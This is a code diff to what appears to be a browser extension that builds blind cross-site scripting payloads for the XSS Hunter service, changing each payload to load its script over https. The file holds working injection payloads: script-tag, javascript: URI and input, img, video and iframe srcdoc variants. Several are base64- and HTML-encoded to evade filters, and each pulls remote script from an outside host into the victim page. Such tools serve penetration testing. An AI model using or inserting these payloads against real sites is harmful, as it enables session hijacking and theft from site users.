@@ -9,17 +9,17 @@ chrome.storage.sync.get('xssHunterSubdomain', function (answer) {
 var payloads = [{
 	title: ' <label><code>&lt;script&gt;</code> Tag Payload</label> - Basic XSS payload.<br>',
 	payload: function (subdomain) {
-		return '"><script src="' + subdomain + '"></script>';
+		return '"><script src="https://' + subdomain + '"></script>';
 	}
 }, {
 	title: '<label><code>javascript:</code> URI Payload</label> - For use where URI\'s are taken as input. <br> ',
 	payload: function (subdomain) {
-		return "javascript:eval('var a=document.createElement(\'script\');a.src=\'" + subdomain + "\';document.body.appendChild(a)')";
+		return "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://" + subdomain + "\\';document.body.appendChild(a)')";
 	}
 }, {
 	title: '<label for="input_tag_payload"><code>&lt;input&gt;</code> Tag Payload</label> - For bypassing poorly designed blacklist systems with the HTML5 <code>autofocus</code> attribute.<br>',
 	payload: function (subdomain) {
-		var temp = 'var a=document.createElement("script");a.src="' + subdomain + '";document.body.appendChild(a);'
+		var temp = 'var a=document.createElement("script");a.src="https://' + subdomain + '";document.body.appendChild(a);'
 		temp = btoa(temp);
 		//html encode
 		temp = htmlEncode(temp);
@@ -28,7 +28,7 @@ var payloads = [{
 }, {
 	title: '<label for="img_tag_payload"><code>&lt;img&gt;</code> Tag Payload</label> - Another basic payload for when <code>&lt;script&gt;</code> tags are explicitly filtered.<br>',
 	payload: function (subdomain) {
-		var temp = 'var a=document.createElement("script");a.src="' + subdomain + '";document.body.appendChild(a);'
+		var temp = 'var a=document.createElement("script");a.src="https://' + subdomain + '";document.body.appendChild(a);'
 		temp = btoa(temp);
 		//html encode
 		temp = htmlEncode(temp);
@@ -37,7 +37,7 @@ var payloads = [{
 }, {
 	title: '<label for="source_tag_payload"><code>&lt;video&gt;&lt;source&gt;</code> Tag Payload</label> - HTML5 payload, only works in Firefox, Chrome and Opera<br>',
 	payload: function (subdomain) {
-		var temp = 'var a=document.createElement("script");a.src="' + subdomain + '";document.body.appendChild(a);'
+		var temp = 'var a=document.createElement("script");a.src="https://' + subdomain + '";document.body.appendChild(a);'
 		temp = btoa(temp);
 		//html encode
 		temp = htmlEncode(temp);
@@ -46,7 +46,7 @@ var payloads = [{
 }, {
 	title: '<label for="srcdoc_tag_payload"><code>&lt;iframe srcdoc=</code> Tag Payload</label> - HTML5 payload, only works in Firefox, Chrome and Opera<br>',
 	payload: function (subdomain) {
-		var temp = '<script>var a=parent.document.createElement("script");a.src="' + subdomain + '";parent.document.body.appendChild(a);</script>;'
+		var temp = '<script>var a=parent.document.createElement("script");a.src="https://' + subdomain + '";parent.document.body.appendChild(a);</script>;'
 		temp = htmlEncodeFull(temp);
 		return '"><iframe srcdoc="' + temp + '">';
 	}
